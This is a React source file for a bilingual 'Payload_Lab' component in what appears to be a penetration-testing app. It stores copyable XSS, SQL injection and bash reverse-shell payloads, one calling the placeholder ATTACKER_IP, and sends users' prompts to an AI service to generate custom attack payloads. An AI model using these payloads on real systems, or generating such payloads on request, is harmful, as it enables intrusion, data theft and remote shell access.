
import React, { useState } from 'react';
import { getCustomPayload } from '../services/geminiService';
import { ExploitPayload } from '../types';

const CATEGORIES = ['XSS', 'SQLi', 'REVERSE_SHELL', 'LFI', 'SSTI', 'RCE'];

const PAYLOAD_TEMPLATES: Record<string, ExploitPayload[]> = {
  'XSS': [
    { name: 'Standard Alert', code: '<script>alert(1)</script>', desc: 'Basic proof of concept.', category: 'XSS' },
    { name: 'Image Error', code: '<img src=x onerror=alert(1)>', desc: 'Bypasses some tag filters.', category: 'XSS' },
  ],
  'SQLi': [
    { name: 'Auth Bypass', code: "' OR 1=1--", desc: 'Classic credential bypass.', category: 'SQLi' },
    { name: 'Union Select', code: "UNION SELECT 1,2,3,database(),user()--", desc: 'Schema enumeration.', category: 'SQLi' },
  ],
  'REVERSE_SHELL': [
    { name: 'Bash TCP', code: 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1', desc: 'Standard Linux shell.', category: 'REVERSE_SHELL' },
  ]
};

interface PayloadGeneratorProps {
  onAudit: (event: string, details: string) => void;
  lang: 'en' | 'ar';
}

const PayloadGenerator: React.FC<PayloadGeneratorProps> = ({ onAudit, lang }) => {
  const [selectedCat, setSelectedCat] = useState('XSS');
  const [attackerIp, setAttackerIp] = useState('127.0.0.1');
  const [customPrompt, setCustomPrompt] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);
  const [aiPayload, setAiPayload] = useState<string | null>(null);

  const handleGenerateCustom = async () => {
    if (!customPrompt) return;
    setIsGenerating(true);
    try {
      const payload = await getCustomPayload(customPrompt, selectedCat);
      setAiPayload(payload);
      onAudit("AI Payload Generation", `Specialized ${selectedCat} artifact synthesized.`);
    } catch (e) {
      console.error(e);
    } finally {
      setIsGenerating(false);
    }
  };

  const t = {
    en: {
      TITLE: 'Payload_Lab',
      SUB: 'Artifact_Synthesis',
      LABEL: 'AI_Custom_Injection',
      PLACEHOLDER: 'DESCRIBE_PAYLOAD_REQUIREMENTS',
      EXECUTE: 'SYNTHESIZE',
      WORKING: 'WORKING...',
      TEMPLATES: 'Stored_Templates'
    },
    ar: {
      TITLE: 'مختبر_الحمولات',
      SUB: 'توليد_الأدوات_الرقمية',
      LABEL: 'حقن_مخصص_بالذكاء_الاصطناعي',
      PLACEHOLDER: 'صف_متطلبات_الحمولة',
      EXECUTE: 'توليد',
      WORKING: 'جاري العمل...',
      TEMPLATES: 'القوالب_المخزنة'
    }
  }[lang];

  return (
    <div className={`space-y-12 pb-40 animate-in fade-in duration-1000 ${lang === 'ar' ? 'font-arabic text-right' : ''}`} dir={lang === 'ar' ? 'rtl' : 'ltr'}>
      <header className="border-b border-white/10 pb-10">
        <div className="flex flex-col xl:flex-row xl:items-end justify-between gap-10">
          <div className="space-y-4 w-full">
            <div className={`flex items-center gap-4 ${lang === 'ar' ? 'flex-row-reverse' : ''}`}>
               <span className="h-1 w-10 bg-cyan-400"></span>
               <span className="text-[11px] font-black text-cyan-400 uppercase tracking-[0.8em]">{t.SUB}</span>
            </div>
            <h1 className="text-4xl sm:text-6xl font-black text-white tracking-tighter uppercase italic break-words">{t.TITLE}<span className="text-cyan-400">_</span></h1>
          </div>
        </div>
      </header>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
        <div className="lg:col-span-4 space-y-4">
          {CATEGORIES.map(cat => (
            <button
              key={cat}
              onClick={() => setSelectedCat(cat)}
              className={`w-full py-5 px-8 text-left border rounded-2xl font-black text-[11px] tracking-widest transition-all ${
                selectedCat === cat ? 'bg-cyan-400 text-black border-cyan-400 shadow-lg shadow-cyan-400/20' : 'bg-black/40 border-white/5 text-slate-500 hover:text-cyan-400'
              }`}
            >
              {cat}
            </button>
          ))}
        </div>

        <div className="lg:col-span-8 space-y-4">
           <div className="glass-panel p-10 space-y-10 border-white/5">
              <div className="space-y-6">
                <label className="text-[11px] font-black text-slate-500 uppercase tracking-widest block ml-1">{t.LABEL}</label>
                <div className="flex gap-4">
                   <input 
                    type="text"
                    value={customPrompt}
                    onChange={(e) => setCustomPrompt(e.target.value)}
                    placeholder={t.PLACEHOLDER}
                    className="flex-1 bg-black border border-white/10 px-6 py-4 text-cyan-400 font-mono text-sm rounded-xl outline-none focus:border-cyan-400/30"
                   />
                   <button 
                    onClick={handleGenerateCustom}
                    disabled={isGenerating || !customPrompt}
                    className="px-10 btn-action text-[10px] disabled:opacity-20 rounded-xl"
                   >
                     {isGenerating ? t.WORKING : t.EXECUTE}
                   </button>
                </div>
                {aiPayload && (
                  <div className="bg-black/60 p-8 border border-cyan-400/30 rounded-2xl animate-in slide-in-from-top-4 shadow-inner">
                    <pre className="text-xs text-cyan-400 font-mono whitespace-pre-wrap break-all leading-relaxed">{aiPayload}</pre>
                  </div>
                )}
              </div>

              <div className="space-y-4">
                <label className="text-[11px] font-black text-slate-500 uppercase tracking-widest block ml-1">{t.TEMPLATES}</label>
                <div className="grid grid-cols-1 gap-4">
                {PAYLOAD_TEMPLATES[selectedCat]?.map((p, idx) => (
                  <div key={idx} className="bg-black/40 border border-white/10 p-6 rounded-2xl hover:border-cyan-400 transition-all cursor-pointer group shadow-sm" onClick={() => navigator.clipboard.writeText(p.code)}>
                    <div className={`flex justify-between items-center mb-4 ${lang === 'ar' ? 'flex-row-reverse' : ''}`}>
                      <span className="text-cyan-400 font-black text-xs uppercase italic">{p.name}</span>
                      <i className="fas fa-copy text-slate-700 group-hover:text-cyan-400 transition-colors"></i>
                    </div>
                    <code className="text-[11px] text-slate-500 group-hover:text-slate-300 break-all transition-colors">{p.code}</code>
                  </div>
                ))}
                </div>
              </div>
           </div>
        </div>
      </div>
    </div>
  );
};

export default PayloadGenerator;
